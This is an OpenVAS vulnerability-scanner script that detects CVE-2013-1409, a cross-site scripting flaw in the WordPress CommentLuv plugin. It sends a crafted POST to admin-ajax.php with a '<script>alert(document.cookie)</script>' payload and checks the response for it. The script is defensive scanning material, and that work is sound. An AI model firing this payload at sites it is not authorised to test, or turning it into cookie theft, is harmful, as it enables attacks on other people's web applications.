###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_commentluv_ajax_nonce_xss_vuln.nasl 6995 2017-08-23 11:52:03Z teissa $
#
# WordPress CommentLuv Plugin '_ajax_nonce' Cross-Site Scripting Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.804512";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 6995 $");
  script_cve_id("CVE-2013-1409");
  script_bugtraq_id(57771);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-08-23 13:52:03 +0200 (Wed, 23 Aug 2017) $");
  script_tag(name:"creation_date", value:"2014-03-11 13:43:20 +0530 (Tue, 11 Mar 2014)");
  script_name("WordPress CommentLuv Plugin '_ajax_nonce' Cross-Site Scripting Vulnerability");

  tag_summary =
"This host is installed with Wordpress CommentLuv Plugin and is prone to
cross site scripting vulnerability.";

  tag_vuldetect =
"Send a crafted data via HTTP GET request and check whether it is able to read
cookie or not.";

  tag_insight =
"Flaw is due to improper validation of the '_ajax_nonce' parameter upon
submission to the '/wp-admin/admin-ajax.php' script.";

  tag_impact =
"Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site

Impact Level: Application";

  tag_affected =
"WordPress CommentLuv Plugin version before 2.92.4";

  tag_solution =
"Upgrade to version 2.92.4 or later,
For updates refer to http://wordpress.org/extend/plugins/commentluv";


  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "solution" , value : tag_solution);

  script_xref(name : "URL" , value : "http://secunia.com/advisories/52092");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/120090");
  script_xref(name : "URL" , value : "https://www.htbridge.com/advisory/HTB23138");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
http_port = 0;
dir = "";
url = "";

## Get HTTP Port
if(!http_port = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  exit(0);
}

## Get WordPress Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:http_port)){
  exit(0);
}

## Construct the attack request
url = dir + '/wp-admin/admin-ajax.php';

postData = 'action=cl_ajax&do=fetch&url=1&_ajax_nonce=%3Cscript%3E'+
                     'alert%28document.cookie%29%3B%3C%2Fscript%3E';

sndReq = string("POST ", url, " HTTP/1.1\r\n",
                "Host: ", get_host_name(), "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: ", strlen(postData), "\r\n",
                "\r\n", postData, "\r\n");

## Send request and receive the response
rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq, bodyonly:FALSE);

## Confirm exploit worked by checking the response
if(rcvRes =~ "HTTP/1\.. 200" && '<script>alert(document.cookie);</script>' >< rcvRes
          && 'error! not authorized' >< rcvRes)
{
  security_message(http_port);
  exit(0);
}
